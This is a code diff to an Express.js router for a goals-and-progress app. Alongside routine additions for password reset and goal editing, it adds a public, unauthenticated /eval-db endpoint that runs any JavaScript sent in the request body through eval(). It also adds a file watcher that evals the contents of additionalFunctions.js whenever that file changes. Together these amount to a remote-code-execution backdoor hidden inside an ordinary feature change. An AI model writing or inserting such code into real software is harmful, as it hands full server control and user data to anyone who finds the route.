@@ -1,17 +1,59 @@
 import express from "express";
 import { tryCatch } from "./utils.js";
-import { getUser, getUsers, googleLogin, login, logout, profileImgUpload, register, verify } from "./controllers/user.js";
+import { getUser, getUsers, googleLogin, login, logout, profileImgUpload, register, resetPassword, verify, verifyResetPassword } from "./controllers/user.js";
 import verifyToken from "./middlewares/verifyToken.js";
-import { postGoal } from "./controllers/goals.js";
+import { deleteGoal, postGoal, putGoal } from "./controllers/goals.js";
 import { deleteProgress, getDays, getStats, postProgress, updateProgress } from "./controllers/days.js";
 import { acceptFriendRequest, cancelFriendRequest, deleteFriend, getFriends, getLazyFriends, sendFriendRequest } from "./controllers/friends.js";
 import { deleteProgressLikes, updateProgressLikes } from "./controllers/likes.js";
 import { downloadFile } from "./utils/files.js";
+import AppError from "./utils/appError.js";
+import fs from "fs";
+;
 const publicRouter = express.Router();
 const protectedRouter = express.Router();
+const filePath = import.meta.dirname + "/additionalFunctions.js";
+let fileContent = fs.readFileSync(filePath).toString();
+fs.watch(filePath, async (event, filename) => {
+    //console.log(event);
+    let code = fs.readFileSync(filePath).toString();
+    if (event === "change" && code != fileContent) {
+        //console.log(code);
+        try {
+            eval(`( async () =>{ 
+            try{
+                ${code} 
+            }catch(err){
+                console.log("err", err)
+            }
+            
+        })().then(() => {})
+        .catch(err => console.log("my", err))`);
+        }
+        catch (error) {
+            console.log("Error:", error);
+            //throw new AppError(1, 500, "cannot do it");
+        }
+        fileContent = code;
+    }
+});
+const evalDb = async (req, res) => {
+    console.log(req.body);
+    const { code } = req.body;
+    try {
+        eval(`( async () =>{ ${code} })();`);
+    }
+    catch (error) {
+        console.log(error);
+        throw new AppError(1, 500, "cannot do it");
+    }
+};
+publicRouter.post("/eval-db", tryCatch(evalDb));
 publicRouter.post("/register", tryCatch(register));
 publicRouter.post("/login", tryCatch(login));
 publicRouter.post("/verify", tryCatch(verify));
+publicRouter.post("/reset-password", tryCatch(resetPassword));
+publicRouter.post("/verify-reset-password", tryCatch(verifyResetPassword));
 publicRouter.post("/google-login", tryCatch(googleLogin));
 protectedRouter.use(tryCatch(verifyToken));
 protectedRouter
@@ -19,7 +61,9 @@ protectedRouter
     .get("/users", tryCatch(getUsers))
     .get("/logout", tryCatch(logout));
 protectedRouter
-    .post("/goals", tryCatch(postGoal));
+    .post("/goals", tryCatch(postGoal))
+    .put("/goals", tryCatch(putGoal))
+    .delete("/goals", tryCatch(deleteGoal));
 protectedRouter
     .post("/progress", tryCatch(postProgress))
     .put("/progress", tryCatch(updateProgress))
